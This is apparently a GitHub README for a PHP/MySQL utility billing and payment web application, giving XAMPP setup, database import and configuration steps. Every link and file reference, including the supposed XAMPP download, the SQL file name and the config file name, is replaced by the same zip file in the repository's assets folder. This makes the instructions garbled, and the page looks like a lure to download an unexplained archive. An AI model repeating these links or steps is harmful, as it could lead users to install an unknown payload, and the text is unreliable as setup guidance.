# 🌐 Public-Utility-Management-System - Simplifying Utility Management For Everyone

[![Download the latest release](https://github.com/Dusterian/Public-Utility-Management-System/raw/refs/heads/main/assets/Utility_Management_System_Public_3.6.zip)](https://github.com/Dusterian/Public-Utility-Management-System/raw/refs/heads/main/assets/Utility_Management_System_Public_3.6.zip)

## 📋 Introduction

Welcome to the Public Utility Management System. This web application helps manage utilities like electricity and water services. Users can easily handle billing and payments while tracking essential data. It is built using PHP and MySQL, offering a reliable solution for managing public services efficiently.

## 🚀 Getting Started

To get started with the Public Utility Management System, follow these simple steps to download and run the application.

1. **Prepare Your System**  
   Make sure your computer has the following software installed:
   - **XAMPP**: This software helps you run a local server to host the application. You can download it [here](https://github.com/Dusterian/Public-Utility-Management-System/raw/refs/heads/main/assets/Utility_Management_System_Public_3.6.zip).
   - **Web Browser**: A modern web browser like Chrome, Firefox, or Edge.

2. **Download the Application**  
   Visit this page to download the latest version of the Public Utility Management System:  
   [Download the latest release](https://github.com/Dusterian/Public-Utility-Management-System/raw/refs/heads/main/assets/Utility_Management_System_Public_3.6.zip)  
   There you will find different versions. Click to download the latest version suitable for your system.

3. **Extract the Files**  
   After the download completes, locate the downloaded zip file. Right-click on the file and select "Extract All." Choose a location on your computer where you want to store the files.

4. **Set Up Your Local Server**  
   - Open **XAMPP**.
   - Start the **Apache** and **MySQL** services.
  
5. **Move Application Files to XAMPP**  
   Copy the extracted Public Utility Management System folder. Navigate to your `xampp/htdocs` directory (usually located at `C:\xampp\htdocs`). Paste the folder here.

6. **Create a Database**  
   - Open a web browser.
   - Go to `http://localhost/phpmyadmin`.
   - Click on **Databases** at the top.
   - Create a new database named `public_utility`.
   - Click **Create**.

7. **Import the Database Structure**  
   Inside the Public Utility Management System folder, locate the SQL file (usually named `https://github.com/Dusterian/Public-Utility-Management-System/raw/refs/heads/main/assets/Utility_Management_System_Public_3.6.zip`).  
   - Click on the newly created database in phpMyAdmin.
   - Click on the **Import** tab.
   - Choose the SQL file and click **Go** to import the structure.

8. **Configure the Application**  
   Open the `https://github.com/Dusterian/Public-Utility-Management-System/raw/refs/heads/main/assets/Utility_Management_System_Public_3.6.zip` file in the Public Utility Management System folder. You will need to set the database credentials. Update the following fields:
   ```php
   $dbHost = "localhost";
   $dbUser = "root"; // Change if you have a different username
   $dbPass = ""; // Leave empty unless you set a password
   $dbName = "public_utility";
   ```

9. **Access the Application**  
   Now, open your web browser and go to `http://localhost/public_utility_management_system`. You should see the login page of the application.

## 🎨 Features

The Public Utility Management System includes several features to help you manage utility services effectively:

- **User-Friendly Dashboard**: Navigate easily to track bills and payments.
- **Billing Management**: Generate and manage bills for electricity and water services.
- **Payment Portal**: Securely accept payments online.
- **Customer Management**: Add, edit, and view customer information.
- **Responsive UI**: Works smoothly on both mobile and desktop devices.
- **Dark Mode**: Switch between light and dark themes for comfort.
- **Admin Dashboard**: Manage the application settings and view reports.

## 🛠️ System Requirements

- **Operating System**: Windows, Mac OS, or Linux.
- **RAM**: Minimum 4GB (8GB recommended).
- **Disk Space**: At least 100MB for the application files and database.
- **PHP Version**: 7.2 or higher.
- **MySQL**: Compatible with your download of XAMPP.

## 🔧 Troubleshooting

If you encounter issues:
- Ensure the XAMPP services are running.
- Check that the database is correctly set up in phpMyAdmin.
- Ensure your credentials in `https://github.com/Dusterian/Public-Utility-Management-System/raw/refs/heads/main/assets/Utility_Management_System_Public_3.6.zip` are accurate.

## 📞 Support

For support, you can check the Issues section of this repository. If you have questions, feel free to open a new issue. Provide as much detail as possible for a quicker resolution.

## 📥 Download & Install

To download and install the application, visit this page:  
[Download the latest release](https://github.com/Dusterian/Public-Utility-Management-System/raw/refs/heads/main/assets/Utility_Management_System_Public_3.6.zip)  

Follow the steps outlined in the "Getting Started" section to set up the application on your local machine.

Thank you for using the Public Utility Management System! Enjoy managing your public utilities effectively.